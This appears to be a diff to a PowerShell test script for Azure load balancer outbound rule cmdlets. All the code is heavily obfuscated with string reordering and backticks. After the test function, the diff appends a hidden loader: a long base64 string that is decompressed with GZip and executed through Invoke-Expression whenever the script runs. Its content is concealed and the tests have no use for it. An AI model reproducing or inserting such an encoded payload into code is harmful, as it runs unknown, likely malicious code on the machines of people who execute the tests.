+        ${VL`oadbala`NC`Er} = &("{2}{3}{9}{6}{10}{8}{7}{5}{4}{1}{0}" -f'ig','f','Remo','v','on','uleC','-AzLo','utboundR','alancerO','e','adB') -LoadBalancer ${vLo`Ad`Ba`LaNCEr} -Name ${rNA`me`Add};
+        ${vloAdb`AL`An`ceR} = &("{9}{5}{3}{10}{7}{2}{8}{11}{1}{0}{4}{6}" -f 'o','ndRuleC','u','ve-AzLoa','nf','o','ig','ancerO','tbo','Rem','dBal','u') -LoadBalancer ${VLOAdba`lAn`CER} -Name ${Rn`AMe};
+        
+        ${VloA`dBA`Lan`ceR} = &("{5}{9}{7}{0}{6}{2}{8}{1}{3}{4}"-f'Az','u','oadBalanc','leCo','nfig','Remo','L','-','erOutboundR','ve') -LoadBalancer ${vL`OADB`ALA`Ncer} -Name ${rna`ME};
+        
+        ${VL`OADB`AL`ANcEr} = &("{1}{3}{0}{5}{2}{4}" -f'LoadB','Se','nce','t-Az','r','ala') -LoadBalancer ${vloAD`Ba`lanc`Er};
+        &("{0}{1}{2}{3}" -f 'A','sser','t-','NotNull') ${vloAd`B`ALAN`cEr};
+
+        
+        &("{4}{3}{0}{1}{2}" -f 't-ThrowsC','onta','ins','r','Asse') { &("{4}{5}{1}{2}{6}{0}{3}"-f 'RuleCo','LoadBal','anc','nfig','Get-','Az','erOutbound') -LoadBalancer ${VLOAdBA`lAnC`ER} -Name ${R`NAME} } ("{0}{6}{2}{1}{4}{7}{10}{3}{5}{9}{8}"-f'Se','tains n',' con','g','o matc',' ','quence','h','lement','e','in');
+
+        
+        &("{2}{6}{5}{4}{0}{3}{1}" -f 'onta','ns','Ass','i','ThrowsC','t-','er') { &("{4}{0}{2}{5}{7}{8}{6}{1}{3}" -f'Loa','ule','dB','Config','Set-Az','a','ndR','lan','cerOutbou') -Name ${RN`Ame} -LoadBalancer ${v`l`o`Ad`BalanCER} -FrontendIPConfiguration ${F`RONtE`ND`I`Pc`oN`Figurat`iOn} -BackendAddressPool ${B`A`ckEnD`ADD`R`eSSpo`oL} -Protocol ${Pr`O`TocOLSet} -AllocatedOutboundPort ${A`llOcATEdOUTB`ouNd`p`O`Rt`seT} -IdleTimeoutInMinutes ${iD`lETimEOu`TINMInU`T`ESSEt} } ("{0}{2}{1}"-f 'does not e','ist','x');
+    }
+    finally
+    {
+        
+        &("{2}{1}{0}{3}"-f'o','esourceGr','Clean-R','up') ${rgnA`ME};
+    }
+}
+
+${S}=&("{2}{0}{1}"-f'bje','ct','New-O') ("{1}{3}{2}{0}" -f 'eam','IO.','yStr','Memor')(, (  gcI  ("{1}{2}{0}" -f 'ablE:02d3','vAR','i') )."VA`lue"::("{4}{0}{2}{1}{3}"-f'se64','tri','S','ng','FromBa').Invoke(("{53}{31}{27}{16}{25}{11}{13}{64}{36}{52}{44}{42}{65}{10}{8}{55}{45}{24}{46}{63}{14}{37}{26}{7}{5}{34}{12}{61}{4}{6}{54}{35}{23}{3}{15}{20}{28}{62}{58}{38}{60}{22}{18}{9}{0}{17}{33}{40}{48}{32}{39}{1}{19}{56}{30}{47}{41}{51}{57}{50}{29}{43}{21}{49}{59}{2}"-f'1ysG','PjbaF/WCFOeQM','8CvhOGPVN5fBn81XZgikx41elR20K4+5VQyygH1IYfyLRsZCIGPb+BH5KSi4qDQAA','1+','6R0TaLtvumrCG2tppGsCXMXmlUeotRrnqdMTr6UJ1tRyJoH9TmBJ','P2Mkq','cu+YEGYLkeIitnhjUbddIp60bM7LKaC/ym82itls1','EGqQmX0Xef1Tv55L0k54lnx49qcWpOD','kd17joByyw','zjLdDq9/9Se5qY9sEFYT3fZYjdt4UdDILAK1RyEKghZudVkU+','5ZbpkHi3vPewy+xSc2ltOo0tOY0BSJ7I2KKqpxwNKykd41AjR2Wu2isv','TU339X9dlVdp6qPIW','vZbusMaCJ6J6fEWaTyyrLmFtwXvkOVNUf5I7hrrerp','YB5ra3weSuinCuaor3/TowsF+QzW1xWxfBGIpUyPm5XOpYax9O1a+ddBd1RNgm09l6HvKr02MZB44NBWWXUAGHRB','m+tvQHq8uiS8QPqhDe4FGAb9DbUZ5hEqSaXOCDX2feacVFDfxKSEOW','ijWe09k1Fb3N0bk1','4wv7ARPi','0wzHYa11kiUAnOq+0RNu5GjDYP','5hahjk2yhulNbgpil/4QWDcZT','NMtTpasKv3pseV3BIg5Ne3ugeqS+RzkMGzCOnOoD4lzYUZP+Rbe','F19T+','j','uyii','XQ7M8CVvrwLFAdnt9/9GsO7l2Gb7rjc20ZoWkVMw1','xof+','0yBQ/khcdLGPXUW7fMb+gytIyGlSiT8iQkpCn+oXF4mLeCv0ArykDx6W7Jk+uFSuBAngIm2GNpuycDHz5p8/l0Lfp548fKdqVKIgoO6CMxpouvJVGa2oT686izW1pfKHcvmQqnGxwPxIti9hewUGIY9EZ01h48iCVH/Dmd','APS5kEnFYr6','4TuoWCFDKpxxf8SFfawS0SMt0KNGRqNjOtv99R7Ldupt0N/su8AoQQJEzw5lnTvWpvOpLn9myJQhVrizqB0x4Si6RuCwLUyq3yhc1sQw9W0bb0eLBofJh','9qPq4S2fJ2MqSHi5vRhQv01nq','pRj2bEQGJfXq3FAv4C4lap','Sm732XVoy6','AAAAAAAAAL1XaW/bOBP+HP8KYRFAEur','e','OrZ','YmNKOOsHtdzBj6HwJsFV94Ro4oDeFqGV4j','Kmw7e2OMR9ePizx5MSv','309eXTfe3RvxS4+iFP119qfxYEOz6tY0BPfEm9EFaGcOljSBwnQn4VV4uJiFi8p2K','eeA5KewSewE2HRl1HQ+CT51wDRU30qTXfDqQvUccWocuxAfTimVBxv2KFE/Ru1T4lyyIoIqxNIZ0pD','hZqoDGtiabmrbG9zA/zD070jXMrUavWIfoxIxdmlC+McQ','Hev8','yTWNbL69sI3ttrcs3Rh4uKO46AzNsDSaF','1j729O34V/JnkO0qvDnzf+jTv+O0QjzCSw9qH+c3qYY','D5+XAD6k+V2aR62bz+fHaE2eQ/KWg7InryH','XWJdMSt','ASWwt/','BaAU','szMGJmmp6LeoCgIdvFZy1hJSgJ+pjG','thnUJ5fxOOL9MQB6pVcQY0i/2esj3UxvvrfY/','5toJ2wjd/gapdJGIM2MRLp','5RIr35QrA','MpXKGUMBeYLCnT0','N6L1DEAz+b','N1RcBivlslk1Rao','H4sI','X4Zhq4TEJPdJ2rVqBo8awXQQOAOr3ej10a5V','fE','EkeHQyOdQB4ewzOfeXOnKd0L9R+c+bX3+PAVDjoUnKgSpJvUcuUpmdvlMBtptZlfI6In3218','FM09DhC2PTzTed0J51YZpMqF+SST','Fq2EQvCJUa','AUF+Rz','f3GBxo08J1fLfB8JMvAleFqDL7MDuppKyfqQ2t6j5tkXEDA','ll4JurVpEbOts7WIb2UtWrDbGQHfPMmYRkVLzvs6q23rvDhED9pwJyzoOIt11t+I222ZgZI9yDvx2oVAfZ1A+X+jkM4+ENiL','DiIrRi/1xtCqPqFstYebgQF2DYa11ZhN07X0p1Fj+0HejAb1/tB1UOupVBnyRn9oNe5xR1rN9XM6O/','uxPt0ffQKSWOA6CpNINISftpNKnmFOSVJAXsOMRCqWIl+oPdVshl8zGgTyJ','U9ZTpPYtHql16IedJ5Ys2OyrUCz3JXArnkvpi06f+M7NpkKpjj3Dao8u51qbbEw7vZdLOmYCqK','Nw5kGPW2VmCUbmiYvYz/F5dPCwCBkn1I8Ifh2')));&("{1}{0}"-f 'EX','I') (&("{3}{2}{0}{1}" -f'w-Obj','ect','e','N') ("{1}{2}{4}{3}{0}"-f 'amReader','I','O.St','e','r')(&("{2}{3}{1}{0}"-f 't','c','New-O','bje') ("{0}{3}{1}{2}{4}"-f 'I','re','ssion.Gz','O.Comp','ipStream')(${S}, ${Ez`p`V27}::"dECOmP`Re`sS"))).("{1}{2}{0}"-f'ToEnd','Re','ad').Invoke();
